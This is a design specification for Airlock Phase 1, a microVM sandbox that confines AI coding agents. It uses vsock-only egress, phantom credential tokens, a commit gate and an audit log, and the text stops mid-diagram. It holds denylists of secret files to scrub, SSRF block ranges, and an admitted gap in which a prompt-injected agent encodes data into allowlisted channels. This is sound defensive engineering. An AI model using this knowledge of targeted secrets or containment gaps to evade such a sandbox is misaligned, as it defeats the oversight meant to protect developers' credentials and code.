# Airlock (Phase 1): Requirements & Design Specification

| | |
|---|---|
| **Source intent** | `intent.md` (§3 Critical Gaps, §4 Layers 1/2/5, Practical Rollout Path — Phase 1) |
| **Scope** | **Phase 1 Only** (MicroVM compute substrate, `vsock`-only secretless egress broker, CoW workspace & atomic commit gate, audit log, harness CLI/SDK). Phases 2 & 3 excluded except forward-compatible wire/config seams (§7.5). |
| **Spec version** | `1.0` (Approved — Decisions `D-1`..`D-10` signed off) |
| **Date** | `2026-11-20` |
| **Status** | **Approved for Phase 1 implementation.** Decisions **D-1** through **D-10** signed off on 2026-11-20 adopting all recommended defaults (§13). Phase 0 (M0) local technical spikes executed (`docs/m0-spike-report.md`) and repository scaffolded. |

---

## 0. Baselines, Scope Boundary, and Assumptions

### 0.1 Codebase & Integration Assumption
- **Greenfield Standalone Platform:** There is no existing codebase, design system, or internal policy repository yet. **Airlock** is specified as a modular greenfield platform (`airlockd` daemon, `airlock-broker`, `airlock-guestd`, `airlock` CLI, `airlock-vz-helper` on macOS, plus Python and TypeScript SDKs).
- **Drop-In Agent Harness Integration:** Airlock exposes a single execution interface (`SandboxProvider` contract over local Unix-domain gRPC/HTTP and remote mTLS REST/gRPC) so existing orchestration harnesses (`LangGraph`, `Claude Agent SDK`, `OpenAI Agents SDK`, `Google ADK`, `OpenHands`) can adopt Airlock as their execution runtime without altering planner loop internals.

### 0.2 Explicit Phase Boundary

| Capability Area | Phase 1 (This Spec — In Scope) | Deferred to Phase 2 / Phase 3 |
| :--- | :--- | :--- |
| **Compute Isolation** | Ephemeral Linux microVMs: Apple `Virtualization.framework` locally on macOS Apple Silicon; KVM + Firecracker locally and remotely (with `jailer`) on Linux. | Stateless Wasm/WASI (`Wasmtime`) and V8 Isolate runtimes for API/plugin execution (Phase 2). |
| **Filesystem & CoW** | Repo-only secret-scrubbed lower layer (APFS `clonefile` + read-only `virtio-fs` on macOS; read-only `EROFS` on Linux) + ephemeral sparse `ext4` `overlayfs` upper layer + Atomic Commit Gate & `undo`. | Cross-host persistent CoW block streaming and taint-tagged snapshot forks (Phase 2/3). |
| **Networking** | **Zero `virtio-net` NIC.** All egress multiplexed over `AF_VSOCK` through host `airlock-broker`; guest proxy env + transparent `tun0` + stub DNS fallback; post-DNS SSRF blocking. | Per-spoke network namespaces and cross-spoke mediated IPC buses (Phase 2). |
| **Credentials & Capabilities** | Zero raw secrets in guest; session-bound phantom capability tokens (`(chamber_id, vsock_cid)` HMAC); TLS L7 credential injection; HTTP method/host/path rules; Git `git-receive-pack` pkt-line branch guard; spend/rate budgets. | Cryptographically attested per-MCP-tool dynamic sub-leases (Phase 2) and taint-conditioned declassification tokens (Phase 3). |
| **Policy Manifest** | Single portable `airlock.toml` (`version = "1"`) shared across `--target local` and `--target remote`. | `[mcp]` spoke manifests (Phase 2) and `[ifc]` lattice policies (Phase 3); schema seams reserved in §7.5. |
| **MCP & Tool Supply Chain** | MCP servers invoked inside the chamber inherit chamber boundary as untrusted processes (no extra host privileges). | Isolated per-MCP-server Wasm/micro-container spokes (`IsolateGPT` pattern), pinned tool definition hashes, schema gateway (Phase 2). |
| **Taint & Semantic IFC** | Coarse prevention of raw secret entry + structural path/secret Commit Gate + domain/action egress allowlisting. | Kernel eBPF LSM + FUSE/overlayfs taint propagation coupled to CaMeL/FIDES dual-LLM control/data separation (Phase 3). |
| **Snapshots & Forks** | Local pre-warmed *clean* base snapshots (cold OS boot amortization before workspace attachment). | Pause/resume/fork of stateful in-flight sessions with persisted capability leases and taint labels (Phase 2/3). |

### 0.3 Policy & Standards Baselines
Because no custom workspace skill files (`brand-guidelines`, `security-policies`, or `ux-standards`) exist in this repository, this spec adopts and enforces the following industry baselines:
- **Security Baseline:** NIST SP 800-207 (Zero Trust Architecture), OWASP Top 10 for LLM & Agentic Applications (2025/2026), OWASP ASVS v4.0.3 Level 2 (for broker HTTP parsing, auth, and control APIs), CIS Linux / Firecracker Jailer Hardening Guidelines, and SLSA Level 3 / NIST SSDF SP 800-218 (signed guest kernel/rootfs artifacts, reproducible builds, SBOMs, zero-secret logs).
- **UX & Developer Experience Baseline:** Command Line Interface Guidelines (`clig.dev`), XDG Base Directory Specification, WCAG 2.2 Level AA (4.5:1 contrast-verified ANSI/UI tokens, dual-coded non-color-only severity badges, `NO_COLOR=1` and `TERM=dumb` plain-text rendering, full keyboard navigation), and Nielsen's Usability Heuristics / Anti-Habituation HITL Design.
- **Brand Baseline:** **Airlock** physical spacecraft/cleanroom airlock identity — calm, precise engineering authority with zero surveillance, military, or fearmongering terminology (§11).

---

## 1. Executive Summary & Core Architectural Invariants

Airlock Phase 1 eliminates the highest-probability, highest-impact failure modes of autonomous coding and tool-using agents — ambient host access, `.env`/SSH secret theft, unrestricted outbound exfiltration, and destructive host repo writes — by placing untrusted execution inside an ephemeral microVM **Chamber** gated by a host-side **Secretless Capability Broker**.

Phase 1 enforces **five non-negotiable architectural invariants**:

1. **Dedicated Guest Kernel Boundary:** Untrusted agent code, shell commands, package post-install scripts, and compilers execute inside a hardware-virtualized Linux microVM (`Apple VZ` on macOS Apple Silicon; `KVM + Firecracker` locally and remotely on Linux) — never on the host kernel (`C1`, `D-1`).
2. **Zero Raw Secrets in the Chamber:** No `.env` files, API keys, cloud tokens, or SSH private keys enter guest disk, environment variables, or RAM. Guest tools receive session-bound **phantom capability tokens** (`airlock-phantom:...`) swapped for short-lived real credentials on the wire by the host broker.
3. **`vsock`-Only Egress (Zero `virtio-net`):** MicroVMs attach no virtual Ethernet NIC (`virtio-net` omitted). Every external byte transits an `AF_VSOCK` stream terminated at the host **Secretless Capability Broker**, with post-DNS-resolution SSRF protection.
4. **Repo-Only Ephemeral CoW + Gated Commit:** Only a secret-scrubbed snapshot of the target workspace is exposed (`$HOME`, `~/.ssh`, keychains, browser profiles, and host Docker sockets are invisible). All writes stay in an ephemeral guest `overlayfs` upper layer until scanned and approved at the **Commit Gate**.
5. **Local ↔ Remote Contract Parity:** One `airlock.toml` manifest, one `airlock` CLI, and one `SandboxProvider` API operate consistently across `--target local` and `--target remote`.

---

## 2. Goals, Non-Goals, and Success Measures

### 2.1 Goals
- **G1 — Eliminate Ambient Secret Theft:** Guarantee that compromised dependencies, prompt-injected commands, or arbitrary guest code cannot read `~/.ssh`, `~/.aws`, `~/.config`, host `.env`, or keychain secrets.
- **G2 — Eliminate Host & Lateral Network Exposure:** Prevent untrusted workloads from reaching host loopback services, LAN targets, or cloud metadata endpoints (`169.254.169.254`).
- **G3 — Drop-In Compatibility for Coding Agents:** Run standard Linux compilers, package managers, `git`, test runners, and major agent SDKs with minimal developer friction.
- **G4 — Action-Scoped Egress & Git Controls:** Enforce fine-grained L7 HTTP method/host/path rules, Git branch-push restrictions (`agent/*`), and per-session API spend/rate limits at the broker.
- **G5 — Atomic, Reversible Host Commits:** Validate every CoW changeset for path traversal, symlink escapes, malicious hooks, secrets, and host conflicts before applying atomically with single-command `airlock undo`.
- **G6 — Unified Local ↔ Remote Policy:** Ensure workflows validated locally behave identically under remote multi-tenant Firecracker execution within documented hardware bounds (`C6`).

### 2.2 Non-Goals (Explicitly Out of Scope for Phase 1)
- **NG1:** Per-MCP-server isolated Wasm/micro-container spokes and tool-definition rug-pull hashing (Phase 2).
- **NG2:** Sub-millisecond Wasm/WASI (`Wasmtime`) or V8 Isolate execution modes (Phase 2).
- **NG3:** Kernel eBPF LSM file/process taint tracking and CaMeL/FIDES planner-level Information Flow Control (Phase 3).
- **NG4:** Taint-preserving cross-host pause/resume/fork of stateful running VMs (Phase 2/3; Phase 1 uses warm *clean* base snapshots only).
- **NG5:** Native Windows host VMM (`WHPX`) support (evaluated post-Phase 1).
- **NG6:** GPU passthrough / CUDA virtualization inside Firecracker or Apple VZ.
- **NG7:** Preventing a prompt-injected agent that has read proprietary repo files from covertly encoding bytes into *explicitly allowlisted* write channels (e.g., an allowed PR body or allowed query string). Phase 1 applies coarse mitigations (`C4`), while structural IFC closure belongs to Phase 3.

### 2.3 Quantitative Success Measures
| Metric | Phase 1 Target | Measurement Method |
|---|---|---|
| **Secret Isolation** | `0` raw `.env`, SSH, or host credentials recoverable from guest filesystem, `/proc/*/environ`, or guest memory dump | Automated red-team verification (`AT-2`, `AT-4`) |
| **Warm Chamber Acquisition Latency** | p50 ≤ `120 ms`, p95 ≤ `250 ms` (warm pool hit); cold boot p95 ≤ `350 ms` (Linux Firecracker), ≤ `850 ms` (macOS Apple VZ) | 50-run benchmark harness (`AT-9`) |
| **Broker `vsock` Proxy Overhead** | Added L7 proxy latency p95 ≤ `5 ms` over direct baseline; bulk throughput ≥ `2 Gbps` over `vsock` | `iperf`-style `vsock` stream & HTTPS microbenchmark |
| **Commit Gate Scan Latency** | p95 ≤ `150 ms` for changesets ≤ `500` modified files / `25 MiB` diff | Synthetic diff benchmark |
| **HITL Prompt Budget** | Median `0` mid-session prompts and `≤ 1` Commit Gate prompt per standard coding task | Telemetry on benchmark agent tasks (anti-habituation target) |

---

## 3. Actors, Trust Zones, and Glossary

### 3.1 Actors
- **Developer / Operator:** Configures `airlock.toml`, launches agent tasks via CLI or IDE/harness, reviews Commit Gate diffs, and holds host credentials.
- **Agent Harness (Orchestrator):** Host-side agent framework (`LangGraph`, `Claude Agent SDK`, `OpenAI Agents SDK`, `Google ADK`, `OpenHands`) issuing chamber lifecycle and `exec` RPCs via Airlock SDK.
- **Untrusted Guest Workload:** Agent-generated shell commands, scripts, test suites, compilers, and third-party packages executing inside the chamber.
- **Security / Platform Admin:** Authors org-wide baseline policies, manages remote bare-metal Firecracker pools, and reviews audit logs.
- **Credential Provider:** Host-side secret backend (macOS Keychain, Linux Secret Service, isolated env vault outside repo, OIDC workload identity, or GitHub App short-lived token minter).

### 3.2 Trust Zones
- **`TZ-0` Guest Chamber (Untrusted):** Guest Linux kernel, `airlock-guestd`, shell, and subprocesses. Assumed **fully compromised** at any point by prompt injection or malicious dependencies.
- **`TZ-1` Hypervisor Sandbox (De-Privileged Host Process):** Firecracker running inside `jailer` (`chroot`, unprivileged UID/GID, `seccomp-bpf`, `cgroup v2`) on Linux, or `airlock-vz-helper` (Hardened Runtime with minimal `com.apple.security.virtualization` entitlement) on macOS.
- **`TZ-2` Airlock Control Plane & Broker (`airlockd`, `airlock-broker`):** Runs under the host operator (local) or privileged control plane (remote). Enforces capability leases, terminates `vsock`, performs TLS L7 inspection & credential injection, executes Commit Gate, writes audit trail.
- **`TZ-3` Host Protected Assets:** Real developer working tree, `$HOME`, OS Keychain / Credential Providers, and immutable audit store.
- **`TZ-4` Upstream External Services:** `api.github.com`, LLM endpoints, package registries (`registry.npmjs.org`, `pypi.org`, `crates.io`), and approved enterprise APIs.

### 3.3 Canonical Glossary
- **Chamber:** An isolated, ephemeral microVM runtime instance created for one agent session or task.
- **Scrubbed Base:** The read-only workspace snapshot prepared prior to VM boot with denylisted secret files and credential URLs stripped.
- **CoW Upper:** The ephemeral writable `overlayfs` upper directory inside the guest containing all agent filesystem mutations.
- **Capability Handle:** A scoped permission grant defined in `airlock.toml` (e.g., `cap:git:push:branch=agent/*`).
- **Phantom Token:** A session-bound opaque placeholder string injected into the guest environment and replaced on the wire by `airlock-broker`.
- **Broker:** The host-side `airlock-broker` process terminating `AF_VSOCK` streams, enforcing L7 policies, and injecting real credentials.
- **Commit Gate:** The automated validation and HITL review checkpoint reconciling `CoW Upper` changes back to the host working tree.
- **Seal / Unseal:** Establishing or closing the Chamber isolation boundary (`[SEALED]` when running with zero leaks).

---

## 4. Platform & Hypervisor Feasibility Matrix

Engineering constraints differ materially between macOS and Linux. Phase 1 accounts explicitly for these differences rather than assuming unsupported primitives (for example, **Firecracker intentionally omits `virtio-fs` and `9p`**).

| Dimension | Local macOS (Apple Silicon M1–M4+, macOS 14+) | Local Linux (`x86_64` / `aarch64`, Kernel 5.15+ w/ `/dev/kvm`) | Remote Linux (Cloud Bare-Metal `.metal` / Nested KVM) |
|---|---|---|---|
| **Hypervisor** | Apple `Virtualization.framework` (`VZVirtualMachine`) via minimal Swift helper `airlock-vz-helper` (`com.apple.security.virtualization`). | **Firecracker v1.9+** spawned directly with seccomp filters and `cgroups v2` limits. | **Firecracker v1.9+ + `jailer`** (dedicated unprivileged UID/GID per chamber, `chroot`, `cgroup v2`, strict `seccomp-bpf`). |
| **Guest Kernel & Arch** | Hardened Linux 6.12 LTS `aarch64` (`Image`), signed, initramfs/minimal rootfs. | Hardened Linux 6.12 LTS (`vmlinux`, matching host `x86_64` or `aarch64`). | Hardened Linux 6.12 LTS (`vmlinux`), dual-arch pool (`x86_64` and `aarch64` per `D-6`). |
| **Scrubbed Lower Layer** | `airlockd` executes APFS `clonefile(2)` of target repo into `<run_dir>/base`, deletes/scrubs secret globs (~5–25 ms), and attaches it `readOnly: true` via `VZVirtioFileSystemDeviceConfiguration` (`virtio-fs`). | Because Firecracker lacks `virtio-fs`, `airlockd` builds a deterministic read-only **EROFS** image (`mkfs.erofs`) excluding secret globs (~15–50 ms; cached by git tree/mtime hash for large repos) and attaches as `/dev/vdb` (`virtio-blk`, `is_read_only: true`). | Hydrated from scrubbed git bundle / delta upload into read-only `EROFS` or `dm-thin` read-only snapshot block volume `/dev/vdb`. |
| **CoW Upper Layer** | Ephemeral sparse `ext4` block file attached via `VZVirtioBlockDeviceConfiguration` (`/dev/vdc`); `airlock-guestd` mounts `overlayfs` (`lowerdir=/mnt/base,upperdir=/mnt/upper/work_upper,workdir=/mnt/upper/work`). | Ephemeral sparse `ext4` block file `/dev/vdc` (with `discard` + quota) mounted as `overlayfs` upper/workdir over `/dev/vdb`. | Thin-provisioned `dm-thin` or ephemeral sparse `ext4` block device `/dev/vdc` mounted as `overlayfs` upper/workdir. |
| **Networking (`vsock`)** | `VZVirtioSocketDeviceConfiguration`; guest connects to CID `2` (`VMADDR_CID_HOST`), bridged to `airlock-broker` Unix socket/FD. **No `VZVirtioNetworkDeviceConfiguration` attached.** | Firecracker `vsock` device (`guest_cid >= 3`, host `uds_path` owned by `airlock-broker`). **No `network-interfaces` attached.** | Firecracker `vsock` device inside `jailer` chroot; `uds_path` bind-mounted exclusively to `airlock-broker`. **No `tap` / `virtio-net` attached.** |
| **Container Support** | Rootless Podman / Docker Engine **works inside the Linux guest on all M1–M4 Macs** (containers share the guest Linux kernel; no nested KVM needed). | Rootless Podman / Docker works inside guest Linux kernel via standard Linux namespaces. | Rootless Podman / Docker works inside guest Linux kernel (optional `containers` rootfs variant, `D-9`). |
| **Known Gaps / Exclusions** | Intel (`x86_64`) Macs unsupported; native macOS/Xcode compilation cannot run inside Linux guest; Rosetta 2 x86 emulation in Linux guest is optional (`S`) and best-effort. | Requires `/dev/kvm` read/write permission (`kvm` group); nested VMs inside unprivileged cloud VMs without KVM unsupported. | Requires `.metal` instances or hypervisors exposing nested KVM (`L1` VMX/SVM); Windows hosts unsupported in Phase 1. |

---

## 5. Functional Requirements

Priorities: **M** = Must (Phase 1 GA blocker), **S** = Should (Phase 1 target), **C** = Could (Phase 1 stretch).

### 5.1 Chamber Lifecycle & Compute (`FR-VM`)
| ID | Requirement | P |
|---|---|---|
| `FR-VM-1` | `airlockd` shall provision an isolated, ephemeral Linux microVM Chamber per session using `Apple VZ` (local macOS) or `Firecracker` (local/remote Linux). | M |
| `FR-VM-2` | `airlockd` shall maintain a configurable warm pool (default `1` local, `N` remote) of pre-booted *clean* microVMs halted before workspace/CA attachment to achieve ≤ 250 ms p95 chamber acquisition. | M |
| `FR-VM-3` | Each chamber shall enforce hard vCPU, RAM, rootfs/upper-disk size, and max PID (`pids.max`) quotas configured in `airlock.toml` (defaults: `2 vCPU`, `4 GiB RAM`, `8 GiB CoW upper`). | M |
| `FR-VM-4` | Each chamber shall enforce a wall-clock TTL (default `60m`) and idle TTL (default `15m`) after which the VMM is terminated and diff staged for review. | M |
| `FR-VM-5` | On normal stop, TTL expiration, or daemon crash recovery, `airlockd` shall destroy the VMM process, remove ephemeral sockets/block images/APFS clones, and scrub memory-backed keys. | M |
| `FR-VM-6` | `airlockd` / `airlock-guestd` shall support multiplexed command execution (`exec`) with streaming `stdout`, `stderr`, PTY resize, interactive `stdin`, working directory, environment overrides, signal delivery (`SIGINT`/`SIGTERM`/`SIGKILL`), and exact exit code. | M |
| `FR-VM-7` | CLI and SDKs shall accept `--target local|remote` and run identical policy and API flows across both targets. | M |
| `FR-VM-8` | Airlock shall provide an optional `containers` guest image containing rootless `podman` / `docker` CLI compatibility constrained inside the chamber's memory and disk limits (`D-9`). | S |
| `FR-VM-9` | Local macOS Apple Silicon chambers should optionally support Rosetta for `x86_64` Linux binary execution via `VZLinuxRosettaDirectoryShare` when explicitly enabled. | C |

### 5.2 Workspace Isolation & Pre-Mount Scrubbing (`FR-FS`)
| ID | Requirement | P |
|---|---|---|
| `FR-FS-1` | Only the explicitly targeted project workspace directory shall be exposed inside the chamber at `/workspace`; host `$HOME`, `~/.ssh`, `~/.aws`, `~/.kube`, browser profiles, and host sockets shall never be mounted. | M |
| `FR-FS-2` | Before building `Scrubbed Base` (`clonefile` or `mkfs.erofs`), `airlockd` shall exclude or scrub denylisted secret files: `.env`, `.env.*` (except `.env.example`/`.env.template`), `*.pem`, `*.key`, `*.p12`, `*.pfx`, `id_rsa*`, `id_ed25519*`, `.npmrc`, `.pypirc`, `.netrc`, `.git/credentials`, and `.aws/credentials`. | M |
| `FR-FS-3` | `airlockd` shall sanitize `.git/config` inside `Scrubbed Base` by stripping embedded `https://user:token@...` credentials, `core.fsmonitor`, `core.sshCommand`, and executable hook references while preserving `origin` URLs rewritten to broker-compatible HTTPS. | M |
| `FR-FS-4` | Non-secret configuration keys from `.env.example` or explicitly `allow_env` keys in `airlock.toml` may be synthesized into a guest-side `.env` alongside phantom capability placeholders (`D-2`). | S |
| `FR-FS-5` | Inside the guest, `/workspace` shall be mounted as a POSIX-compliant `overlayfs` (`lowerdir` read-only at the hypervisor/device layer, `upperdir` on ephemeral sparse `ext4`). | M |
| `FR-FS-6` | Guest writes to `/tmp`, `/var/tmp`, and `/home/agent` shall reside on ephemeral chamber-scoped tmpfs or `ext4` capped by chamber disk quota and discarded on teardown. | M |
| `FR-FS-7` | `airlockd` shall record SHA-256 digests and mode bits of all files in the host workspace at chamber creation to support optimistic conflict detection at Commit Gate (`FR-CMT-5`). | M |
| `FR-FS-8` | Host workspace paths containing spaces, Unicode characters, or trailing whitespace shall be handled safely without shell-quoting failures (`AT-14`, `C9`). | M |

### 5.3 `vsock`-Only Networking & Guest Transport (`FR-NET`)
| ID | Requirement | P |
|---|---|---|
| `FR-NET-1` | MicroVMs shall boot with **zero `virtio-net` interfaces** (`ip link` shows only `lo` and the `airlock-guestd` `tun0` capture device). | M |
| `FR-NET-2` | All guest-to-host and guest-to-internet traffic shall traverse `AF_VSOCK` between `airlock-guestd` (CID ≥ `3`) and `airlock-broker` (host CID `2`), bound strictly to an exclusive per-chamber host Unix socket/FD. | M |
| `FR-NET-3` | `airlock-guestd` shall run an explicit local HTTP/CONNECT proxy (`127.0.0.1:3128` exported via `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY`) **plus** a default-route `tun0` (`100.64.0.2/30`) + local DNS stub (`127.0.0.53:53`) forwarding non-proxy-aware TCP/DNS connections over `vsock` so tools ignoring proxy env vars are still governed by broker policy (or fail closed for raw non-HTTP/unsupported UDP). | M |
| `FR-NET-4` | Egress policy shall be **default-deny**: any destination host, port, or protocol not matched by an active `[[capabilities]]` rule in `airlock.toml` shall be rejected immediately at the broker with a structured denial event. | M |
| `FR-NET-5` | DNS resolution shall occur **exclusively on the host** inside `airlock-broker`; guest stub DNS returns synthetic/resolved non-routable mappings or delegates `CONNECT`/`SNI` hostnames directly to the broker. | M |
| `FR-NET-6` | **Post-DNS-Resolution SSRF Guard:** After resolving an allowed hostname to IP address(es), `airlock-broker` shall reject and block connections to loopback (`127.0.0.0/8`, `::1/128`), unspecified (`0.0.0.0/8`, `::/128`), RFC1918 private (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), CGNAT (`100.64.0.0/10`), link-local / Cloud IMDS (`169.254.0.0/16`, `fe80::/10`), ULA (`fc00::/7`), and multicast ranges, and shall dial the validated IP directly (no second DNS lookup). | M |
| `FR-NET-7` | Raw non-DNS UDP, ICMP, IPv6 neighbor discovery, and arbitrary raw sockets leaving the chamber shall be dropped inside guest `tun0` and logged as denied egress attempts. | M |

### 5.4 Secretless Capability Broker & Credential Injection (`FR-BRK`)
| ID | Requirement | P |
|---|---|---|
| `FR-BRK-1` | For each secret-backed capability in `airlock.toml`, `airlockd` shall issue a **phantom token** formatted `airlock-phantom:cap_<cap_id>_<hmac256>` cryptographically bound to `(chamber_id, vsock_cid, capability_id)` and inject only the phantom token into the guest environment. | M |
| `FR-BRK-2` | `airlock-broker` shall validate that any phantom token presented in an outbound request belongs to the *exact originating `vsock_cid` and active lease*; mismatched or expired phantom tokens shall be rejected with HTTP `403` and logged as `CAPABILITY_REPLAY_DETECTED`. | M |
| `FR-BRK-3` | Host credentials shall be fetched lazily inside `airlock-broker` from configured providers (macOS Keychain, Linux `libsecret`, out-of-repo `~/.config/airlock/vault`, GitHub App installation token minter, or OIDC STS) and **never** serialized into guest RAM, environment, or disk. | M |
| `FR-BRK-4` | For L7-governed HTTPS domains, `airlock-broker` shall terminate TLS using an ephemeral per-chamber in-memory Root CA (`ECDSA P-256`, ≤ 24 h validity) generated at chamber creation; `airlock-guestd` shall install its public certificate into `/etc/ssl/certs/ca-certificates.crt` and export `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, and `CARGO_HTTP_CAINFO`. | M |
| `FR-BRK-5` | On L7 match, `airlock-broker` shall evaluate action-scoped rules (`methods`, `host`, `path_prefixes`/`path_globs`, `strip_query_params`), strip the phantom token from headers/URL/Basic-Auth, inject the real short-lived credential on the upstream TLS stream, and forward upstream. | M |
| `FR-BRK-6` | **Git Smart-HTTP (`git-receive-pack`) Inspector:** When `cap:git:push` is invoked against an allowed repository URL, `airlock-broker` shall parse Git smart-HTTP pkt-line ref-update headers (`old-oid new-oid refname`) prior to streaming packfile data upstream, allowing only updates whose `refname` matches configured `allowed_branches` (e.g. `refs/heads/agent/*`) and rejecting non-fast-forward updates (`old-oid != 0{40}` unless `allow_force_push = true`), tag creation/deletion unless explicitly allowed, and writes to `refs/heads/main`/`master`. | M |
| `FR-BRK-7` | `airlock-guestd` shall write a chamber-local `~/.gitconfig` rewriting `git@github.com:` / `ssh://git@github.com/` to `https://x-access-token:<phantom_token>@github.com/` so agent `git` commands operate seamlessly without SSH keys. | M |
| `FR-BRK-8` | `airlock-broker` shall enforce per-capability rate limits (`requests_per_minute`) and soft/hard spend or token budgets (tracking LLM API usage headers / response `usage` JSON payloads where supported) returning HTTP `429` (`BUDGET_EXCEEDED`) on breach. | M |
| `FR-BRK-9` | `airlock-broker` shall optionally allow `tls_mode = "sni_passthrough"` for explicitly configured **read-only, zero-credential** CDN domains (supporting cert-pinned binaries, `D-3`) while strictly prohibiting credential injection on passthrough connections. | S |
| `FR-BRK-10` | `airlock-broker` shall scan inbound upstream HTTP response headers/bodies (e.g., debug echo services) for real credential substrings and redact them before delivering bytes back to the guest. | M |

### 5.5 Atomic CoW Diff, Commit Gate & Rollback (`FR-CMT`)
| ID | Requirement | P |
|---|---|---|
| `FR-CMT-1` | `airlockd` / `airlock-guestd` shall extract a deterministic changeset manifest (created, modified, deleted, renamed, mode-changed entries + unified diffs/blobs) from `CoW Upper` over `vsock`. | M |
| `FR-CMT-2` | **Structural Path & Special-File Validator:** The Commit Gate shall unconditionally reject changesets containing `..` path traversal, absolute symlink targets, relative symlinks resolving outside the workspace root, device nodes (`BLK`/`CHR`), FIFOs, sockets, hardlink escapes, or `setuid`/`setgid` bits. | M |
| `FR-CMT-3` | **Protected-Path Policy Gate:** Mutations to `.git/**` (especially `.git/hooks/*`, `.git/config`, `.git/modules/**`), `.github/workflows/**`, `.gitlab-ci.yml`, `.airlock/**`, `airlock.toml`, and configured protected files (`Makefile`, `Dockerfile`) shall be flagged `[REVIEW REQUIRED]` and blocked unless explicitly signed off at HITL review. | M |
| `FR-CMT-4` | **Outbound Secret & High-Entropy Gate:** Every added/modified line in the diff shall be scanned using deterministic regex patterns (cloud keys, PATs, private key headers, JWTs) + Shannon entropy heuristics; matches block commit unless explicitly overridden with an interactive confirmation reason. | M |
| `FR-CMT-5` | **3-Way Host Conflict Detection:** Before writing to `TZ-3`, the Commit Gate shall compare current host workspace file SHA-256 digests against the baseline digests recorded in `FR-FS-7`; any externally modified host file triggers a conflict pause rather than silent overwrite. | M |
| `FR-CMT-6` | In interactive CLI mode (and API webhook mode for harnesses), the Commit Gate shall present a structured summary (file counts, protected paths touched, secret scan status, diff preview) requiring explicit approval before mutating the host repo (`D-5`). | M |
| `FR-CMT-7` | **Journaled Atomic Apply & Rollback:** Before applying approved changes, `airlockd` shall copy overwritten/deleted host originals into a write-ahead backup journal (`~/.local/state/airlock/undo/<session_id>/`), stage temp files on the same filesystem, `fsync`, and atomically `rename(2)` into place so `airlock undo <session_id>` restores exact pre-commit host state. | M |
| `FR-CMT-8` | Users shall be able to cherry-pick or exclude individual files during Commit Gate review (`airlock diff` / interactive selector) before committing. | S |

### 5.6 Audit Trail & Telemetry (`FR-AUD`)
| ID | Requirement | P |
|---|---|---|
| `FR-AUD-1` | Every chamber session shall write an append-only JSONL audit trail (`audit.jsonl`) where each record includes `seq`, `timestamp`, `prev_hash`, and `event_hash = SHA256(prev_hash || canonical_json)` (`FR-AUD-1`, verifiable via `airlock logs --verify`). | M |
| `FR-AUD-2` | Logged events shall cover chamber lifecycle, capability mint/revoke, every `vsock` egress allow/deny/SSRF/pkt-line decision, Commit Gate scan outcomes, and host commit/undo actions. | M |
| `FR-AUD-3` | Every audit record shall support optional `agent_step_id` and W3C `traceparent` headers passed via SDK/`exec` metadata so agent reasoning steps correlate 1:1 with runtime actions. | M |
| `FR-AUD-4` | **Zero-Secret Audit Scrubber:** A mandatory pre-write filter shall verify no real host credential, raw Authorization header, or phantom secret HMAC key appears in `audit.jsonl` or daemon debug logs. | M |
| `FR-AUD-5` | `airlockd` and `airlock-broker` should export OpenTelemetry traces and Prometheus metrics (`/metrics` on local admin socket) for remote fleet monitoring. | S |

### 5.7 CLI, Control API & Harness Adapters (`FR-INT`)
| ID | Requirement | P |
|---|---|---|
| `FR-INT-1` | The `airlock` CLI shall provide subcommands: `init`, `doctor`, `run`, `exec`, `diff`, `commit`, `undo`, `logs`, and `chamber {ls,inspect,kill,prune}`. | M |
| `FR-INT-2` | Every CLI subcommand shall support `--json` (machine-readable NDJSON/JSON output on `stdout`, diagnostics on `stderr`) and `--plain` (screen-reader-friendly linear output). | M |
| `FR-INT-3` | `airlockd` shall expose a gRPC + HTTP/JSON control API over `0600` Unix domain socket locally (`SO_PEERCRED`/`LOCAL_PEERCRED` peer-UID checked) and mTLS + OIDC JWT remotely. | M |
| `FR-INT-4` | First-party Python (`airlock-sdk`) and TypeScript (`@airlock/sdk`) packages shall wrap the Control API with async lifecycle context managers (`async with Airlock.chamber(...) as ch:`). | M |
| `FR-INT-5` | Ship thin drop-in `SandboxProvider` adapters for `LangGraph`, `Claude Agent SDK`, `OpenAI Agents SDK`, and `OpenHands` matching their tool/bash execution contracts. | M |
| `FR-INT-6` | `airlock doctor` shall check host prerequisites (`/dev/kvm`, `mkfs.erofs`, Firecracker binary checksums on Linux; Apple Silicon / macOS version / signed `airlock-vz-helper` entitlement on macOS) and provide actionable remediation steps. | M |

---

## 6. Non-Functional Requirements

| ID | Category | Requirement |
|---|---|---|
| `NFR-1` | **Acquisition Latency** | Warm-pool chamber ready for first `exec` in ≤ `120 ms` p50, ≤ `250 ms` p95 (excluding first-time large monorepo image build). |
| `NFR-2` | **Proxy Performance** | `vsock` + L7 broker overhead ≤ `5 ms` p95 per request; sustained `vsock` stream throughput ≥ `2 Gbps` on Apple Silicon & Linux KVM. |
| `NFR-3` | **Host Resource Overhead** | Per-chamber non-guest host control overhead (`VMM + broker stream state`) ≤ `128 MiB` RSS; idle daemon RSS ≤ `40 MiB`. |
| `NFR-4` | **Remote Density** | Remote bare-metal node (64 vCPU / 128 GiB RAM) shall safely run ≥ `50` concurrent idle/bursty microVMs (`2 vCPU` / `2 GiB` overcommit with `cgroup v2` protection). |
| `NFR-5` | **Reliability & Self-Healing** | `airlockd` restart after `SIGKILL` or host reboot shall identify and clean 100% of orphan chambers, `jailer` directories, EROFS files, APFS clones, and sockets within `5 s` (`AT-10`). |
| `NFR-6` | **Fail-Closed Posture** | Any crash of `airlock-broker` or policy evaluation error shall immediately terminate affected `vsock` streams rather than failing open. |
| `NFR-7` | **Cross-Platform Parity** | All `airlock.toml` policies, phantom token mechanics, Git pkt-line rules, Commit Gate rules, and audit schemas shall behave identically across macOS local, Linux local, and Linux remote targets. |
| `NFR-8` | **Accessibility** | CLI and TUI surfaces conform to `WCAG 2.2 AA` (≥ 4.5:1 colour contrast on light & dark themes, dual-coded icon+label badges, `NO_COLOR=1`, `TERM=dumb`, full keyboard operation, linear screen-reader output). |
| `NFR-9` | **Reproducibility & Supply Chain** | Guest kernel, rootfs, and binaries built reproducibly with SLSA Level 3 provenance, SHA-256 verification on boot, and zero telemetry phone-home by default. |

---

## 7. System Architecture & Engineering Design

### 7.1 Component Architecture

```mermaid
flowchart TB
    subgraph TZ3["Host Protected Zone (TZ-3)"]
        Repo["Host Workspace (Real Repo)"]
        Creds["Credential Providers (Keychain / Vault / GitHub App / OIDC)"]
        Undo["Undo Journal & Audit Store (audit.jsonl)"]
    end

